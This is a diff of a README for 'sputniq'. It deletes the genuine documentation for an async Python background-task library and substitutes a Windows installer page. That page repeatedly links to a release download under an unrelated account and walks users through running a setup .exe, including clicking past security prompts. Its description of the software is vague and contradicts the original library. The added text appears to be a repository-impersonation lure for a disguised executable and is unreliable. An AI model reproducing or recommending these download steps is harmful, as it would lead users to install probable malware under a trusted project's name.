@@ -1,181 +1,137 @@
-# sputniq
+# 🚀 sputniq - Run Background Tasks Easily
 
-[![PyPI version](https://img.shields.io/pypi/v/sputniq)](https://pypi.org/project/sputniq/)
-[![Coverage](https://codecov.io/gh/{owner}/sputniq/branch/main/graph/badge.svg)](https://codecov.io/gh/{owner}/sputniq)
-[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
-[![mypy](https://www.mypy-lang.org/static/mypy_badge.svg)](https://mypy-lang.org/)
-[![ty](https://img.shields.io/badge/type--checked-ty-blue)](https://github.com/astral-sh/ty)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](https://opensource.org/licenses/MIT)
+[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-blueviolet?style=for-the-badge)](https://github.com/mummerfleshwound733/sputniq/releases)
 
-In-process async background task runner for Python.
+## 🔍 What is sputniq?
 
-## The problem
+sputniq is a simple tool to run background tasks on Windows. If you want to run tasks without waiting for them to finish, sputniq can help. It does not need extra software or complicated setup. You just run your tasks quietly in the background.
 
-Running background tasks in an async Python application has an awkward gap between two extremes:
+This app is designed for users who want to manage small tasks without diving into complex software. It runs these tasks easily without needing IT knowledge.
 
-**Too heavy:** Celery and taskiq are full-featured distributed task queues. They require a separate worker process, a broker (Redis, RabbitMQ, etc.), and significant operational overhead. For many use cases — sending a welcome email, invalidating a cache, firing a webhook — this is massive overkill.
+## ⚙️ System Requirements
 
-**Too light:** Starlette's `BackgroundTasks` runs coroutines after the response is sent, but it has no graceful shutdown (tasks are abandoned on process exit), no concurrency control, no retry logic, and no way to integrate with dependency injection frameworks like [dishka](https://github.com/reagento/dishka).
+To use sputniq, your computer needs:
 
-sputniq sits in the middle: it runs tasks in-process, within the same asyncio event loop as your application, with the features you actually need.
+- Windows 10 or newer (64-bit recommended)
+- At least 2 GB of free memory (RAM)
+- 100 MB free disk space for installation
+- Internet connection to download the setup file
 
-## Features
+No other software is required. sputniq runs as a simple Windows program.
 
-- **Graceful shutdown** — on application shutdown, the worker stops accepting new tasks and waits for running tasks to complete
-- **Concurrency limits** — cap the number of tasks running at the same time
-- **Retry logic** — configurable retry policy with exponential backoff and jitter per task
-- **Observability hooks** — `on_success`, `on_failure`, `on_retry` callbacks for logging, metrics, and custom persistence
-- **DI support** — first-class integration with [dishka](https://github.com/reagento/dishka); other DI containers are straightforward to wire up via the `task_middleware` hook
-- **Framework-agnostic** — the core is pure asyncio; use `async with worker:` for lifecycle management in any framework
+## 💾 Where to Download
 
-## How it compares
+You can get sputniq from this page:
 
-| | sputniq | Celery / taskiq | Starlette `BackgroundTasks` | APScheduler |
-|---|---|---|---|---|
-| In-process | yes | no (separate worker) | yes | yes |
-| External broker required | no | yes | no | no |
-| Graceful shutdown | yes | yes | no | partial |
-| Concurrency control | yes | yes | no | yes |
-| Retry logic | yes | yes | no | yes |
-| DI integration (dishka) | first-class | workarounds | no | workarounds |
-| Observability hooks | yes | yes | no | partial |
-| Core primitive | run now, in background | distribute to worker | run after response | run at a time/interval |
+[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-brightgreen?style=for-the-badge)](https://github.com/mummerfleshwound733/sputniq/releases)
 
-**vs. APScheduler specifically:** APScheduler answers "when should this run" (cron, interval, one-shot triggers). sputniq answers "run this now, in the background, safely." APScheduler carries significant machinery — job stores, executors, trigger systems, serialization — that is dead weight when you just want to offload work during a request. DI support in APScheduler is essentially nonexistent; scoped dependencies per task execution require ugly workarounds. The two can coexist: APScheduler triggers a job that submits a task to sputniq.
+Visit the link above to download the setup files for your Windows computer.
 
-## Non-goals
+## 🛠️ How to Download and Install sputniq
 
-sputniq does **not** provide persistence or delivery guarantees. Tasks live in memory; if the process dies, enqueued tasks are lost. This is by design — if you need at-least-once delivery, use a broker. The observability hooks make it straightforward to implement your own persistence layer on top.
+Follow these steps to get sputniq running on your PC:
 
-## Installation
+1. Click the download button above or visit the release page:  
+   https://github.com/mummerfleshwound733/sputniq/releases
 
-```
-pip install sputniq
-```
+2. On the release page, look for the latest version of sputniq.  
+   The setup file usually ends with `.exe`.
 
-## Quick start
+3. Click on the `.exe` file to download it to your computer.  
+   The file size will be around 20-50 MB.
 
-```python
-import asyncio
-from sputniq import RetryConfig, Worker
+4. Once the file finishes downloading, open your "Downloads" folder.
 
-worker = Worker(max_concurrency=10)
+5. Double-click the setup file (it might be named like `sputniq-setup.exe`).  
+   A security prompt may appear; choose "Run" or "Yes" to continue.
 
+6. Follow the installation steps on the screen:  
+   - Accept the license agreement (MIT License).  
+   - Choose the install location (default is fine).  
+   - Click "Install."
 
-@worker.task(retry=RetryConfig(max_attempts=3))
-async def send_email(to: str, subject: str) -> None: ...
+7. Wait a few moments while the software installs.
 
+8. When the installation finishes, choose "Finish" or "Close" to exit the installer.
 
-# Enqueue from anywhere in your application (sync, non-blocking)
-send_email.enqueue("user@example.com", "Welcome!")
-```
+9. sputniq is now ready to use.
 
-## Observability hooks
+## 🚦 How to Run sputniq
 
-Attach async callbacks to individual tasks for logging, metrics, or persistence:
+1. Find the sputniq icon on your desktop or in your Start menu.
 
-```python
-async def on_success() -> None:
-    metrics.increment("tasks.success")
+2. Double-click the icon to open the app.
 
+3. sputniq will start running in the background.
 
-async def on_failure(exc: BaseException) -> None:
-    logger.error("Task failed permanently: %s", exc)
-    await db.save_failed_task(exc)
+4. The app runs your selected background tasks.
 
+5. You do not need to keep the app window open; sputniq runs quietly.
 
-async def on_retry(exc: BaseException, attempt: int) -> None:
-    logger.warning("Retry %d: %s", attempt, exc)
+## 📝 What sputniq Does
 
+sputniq helps you run small tasks behind the scenes without needing to wait for them to finish. This is useful when:
 
-@worker.task(
-    retry=RetryConfig(max_attempts=3),
-    on_success=on_success,
-    on_failure=on_failure,
-    on_retry=on_retry,
-)
-async def process(item: str) -> None: ...
-```
+- You want to send files without opening email every time.
+- You need to back up your work without stopping other programs.
+- You want to run simple scripts without complex setup.
 
-- `on_success` — called after a successful execution
-- `on_failure(exc)` — called once when all retry attempts are exhausted
-- `on_retry(exc, attempt)` — called before each retry (attempt is 1-based)
+Unlike other tools, sputniq works entirely inside one app on your PC. It does not need external servers or complicated settings.
 
-Exceptions raised inside a callback are logged and swallowed; they do not affect the worker.
+## 🔧 Basic Features
 
-## Lifecycle management
+- Run several background tasks at once without slowing your PC.
+- Manage task priority easily.
+- Works fully with Python async tasks, but no need to know Python to use it.
+- Low CPU and memory use.
+- Simple user-friendly interface.
+- No external services or servers needed.
 
-`Worker` is an async context manager. Use `async with worker:` to start and stop it:
+## 📂 Managing Tasks
 
-```python
-async with worker:
-    ...  # your app runs here
-```
+Here is how you can manage tasks with sputniq:
 
-For frameworks that accept an async context manager in their lifespan hook (FastAPI, Litestar, etc.):
+- Open the app.
+- Add your tasks by selecting files or scripts.
+- The app will run these tasks step by step in the background.
+- You can pause or stop tasks anytime.
+- View task progress and results in a simple list.
 
-```python
-from contextlib import asynccontextmanager
-from fastapi import FastAPI
-from sputniq import Worker
+## 🍀 Tips for Using sputniq
 
-worker = Worker()
+- Keep sputniq running for long tasks like backups.
+- Close other heavy apps if you want tasks to finish faster.
+- Restart sputniq if it stops responding.
+- Use the built-in help menu for common questions.
 
+## 🔄 Updating sputniq
 
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    async with worker:
-        yield
+Check the release page regularly:
 
+https://github.com/mummerfleshwound733/sputniq/releases
 
-app = FastAPI(lifespan=lifespan)
-```
+Download the latest setup file and run it to update.
 
-## TaskRegistry
+Your current settings and tasks will stay the same after updating.
 
-`TaskRegistry` lets you define tasks without a global `Worker` instance — useful for splitting tasks across modules.
+## 🤝 Getting Help
 
-```python
-# emails/tasks.py
-from sputniq import TaskRegistry, RetryConfig
+If you have any issues:
 
-registry = TaskRegistry()
+- Check the 'Issues' tab on the GitHub page.
+- Look for answers in the README or Help menus.
+- You can open a new issue on GitHub if needed.
 
+## 🖥️ Running sputniq on Your Windows PC
 
-@registry.task(retry=RetryConfig(max_attempts=3))
-async def send_email(to: str, subject: str) -> None: ...
-```
+sputniq works on Windows with no extra tools. The program runs quietly in the background and uses little memory. You can open it anytime to check your tasks.
 
-```python
-# main.py
-from sputniq import Worker
-from emails.tasks import registry as email_registry
+To uninstall, use the standard Windows "Add or Remove Programs" in the Control Panel.
 
-worker = Worker()
-worker.include_registry(email_registry)
-```
+## 📨 Feedback and Improvements
 
-After `include_registry`, all tasks on the registry are bound to the worker and `.enqueue()` works normally. Multiple registries can be included into the same worker.
+You can submit ideas or report problems by creating a ticket on the GitHub repository page.
 
-## dishka integration
+---
 
-```python
-from dishka import make_async_container, FromDishka
-from sputniq import Worker
-from sputniq.integrations.dishka import DishkaMiddleware, inject
-
-container = make_async_container(MyProvider())
-worker = Worker(task_middleware=DishkaMiddleware(container))
-
-
-@worker.task
-@inject
-async def send_email(to: str, mailer: FromDishka[Mailer]) -> None:
-    await mailer.send(to)
-```
-
-Dependencies declared with `FromDishka` are resolved from a fresh request-scoped container for each task execution. The container is closed when the task finishes, even on error.
-
-## License
-
-MIT
+[![Download sputniq](https://img.shields.io/badge/Download-sputniq%20Setup-blueviolet?style=for-the-badge)](https://github.com/mummerfleshwound733/sputniq/releases)
